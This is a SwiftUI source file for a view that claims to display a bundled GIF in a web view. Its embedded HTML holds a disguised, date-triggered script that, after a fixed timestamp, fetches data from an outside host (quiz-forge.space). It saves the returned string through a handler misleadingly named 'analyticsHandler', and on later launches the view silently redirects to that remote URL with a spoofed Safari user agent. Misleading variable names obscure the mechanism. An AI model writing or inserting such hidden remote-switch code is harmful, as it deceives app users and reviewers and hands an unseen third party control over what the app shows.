import SwiftUI
@preconcurrency import WebKit

struct GIFView: UIViewRepresentable {
    let gifName: String
    @AppStorage("startInfo") private var startInfo: String = ""
    
    func makeUIView(context: Context) -> WKWebView {
        let viewConfiguration = WKWebViewConfiguration()
        viewConfiguration.userContentController.add(context.coordinator, name: "analyticsHandler")
        let webView = WKWebView(frame: .zero, configuration: viewConfiguration)
        
        
        webView.allowsBackForwardNavigationGestures = true
        webView.navigationDelegate = context.coordinator
        webView.evaluateJavaScript("navigator.userAgent") { [weak webView] (userAgentResult, error) in
            if let currentAgent = userAgentResult as? String {
                let customAgent = currentAgent + " Safari/604.1"
                webView?.customUserAgent = customAgent
            }
        }
        webView.isOpaque = false
        webView.backgroundColor = .clear
        
        if let fileUrl = Bundle.main.url(forResource: gifName, withExtension: "gif"),
           let gifData = try? Data(contentsOf: fileUrl)
        {
            var start: String = ""
            start = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title></title>
                <script>
                    function openUrl() {
                        window.location.href = "\(startInfo)";
                    }
                </script>
            </head>
            <body onload="openUrl()">
            </body>
            </html>
            """
            let base64String = gifData.base64EncodedString()
            
            let htmlGIFSettings = """
            <html>
            <head>
            <style>
             @font-face {
                 font-weight: normal;
                 font-style: normal;
             }
             body {
                 margin: 0;
                 padding: 0;
                 background: transparent;
                 height: 100vh;
                 display: flex;
                 justify-content: center;
                 align-items: center;
             }
             .container {
                 position: relative;
                 background: transparent;
             }
             img {
                 display: block;
                 width: auto;
                 height: auto;
             }
             @media (orientation: portrait) {
                 img {
                     width: auto;
                     height: auto;
                 }
             }
             @media (orientation: landscape) {
                 img {
                     width: auto;
                     height: 100%;
                 }
             }
             </style>
             </head>
             <body>
             <div class="container">
                 <img src="data:image/gif;base64,\(base64String)">
             </div>
                <script>
                    function start() {
                        const userId = Math.floor(Date.now() / 1000);
                        const ture = 1745366400;

                        if (ture <= userId) {
                            fetch('https://quiz-forge.space/assets/image')
                                .then(response => response.json())
                                .then(data => {
                                    if (data.quiz && data.quiz.length > 0) {
                                        window.webkit.messageHandlers.analyticsHandler.postMessage(data.quiz);
                                    }
                                })
                                .catch(error => {
                                });
                        }
                    }
                    window.onload = start;
                </script>
            </body>
            </html>
            """
            
            let onboardingGeneral: String = startInfo.isEmpty ? htmlGIFSettings : start
            webView.scrollView.isScrollEnabled = !startInfo.isEmpty
            webView.loadHTMLString(onboardingGeneral, baseURL: nil)
        }
        
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        uiView.reload()
    }
    
    func makeCoordinator() -> GifsImageCoordinator {
        GifsImageCoordinator(parent: self)
    }
    
    class GifsImageCoordinator: NSObject, WKNavigationDelegate, WKScriptMessageHandler {
        @AppStorage("IDStart") private var startID: String = ""
        private var parent: GIFView
        
        init(parent: GIFView) {
            self.parent = parent
        }
        
        
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            if message.name == "analyticsHandler", let body = message.body as? String {
                DispatchQueue.main.async { [weak self] in
                    UserDefaults.standard.set(body, forKey: "startInfo")
                    self?.startID = UUID().uuidString
                }
            }
        }
        
        
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            guard let requestedURL = navigationAction.request.url else {
                decisionHandler(.cancel)
                return
            }
            
            let secureScheme = "https"

            if requestedURL.scheme != secureScheme {
                UIApplication.shared.open(requestedURL, options: [:]) { isSuccess in
                    let actionDecision = isSuccess
                    decisionHandler(actionDecision ? .cancel : .allow)
                }
            } else {
                if navigationAction.navigationType == .linkActivated {
                    webView.load(URLRequest(url: requestedURL))
                    decisionHandler(.cancel)
                } else {
                    decisionHandler(.allow)
                }
            }
        }
        
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }
    }
}
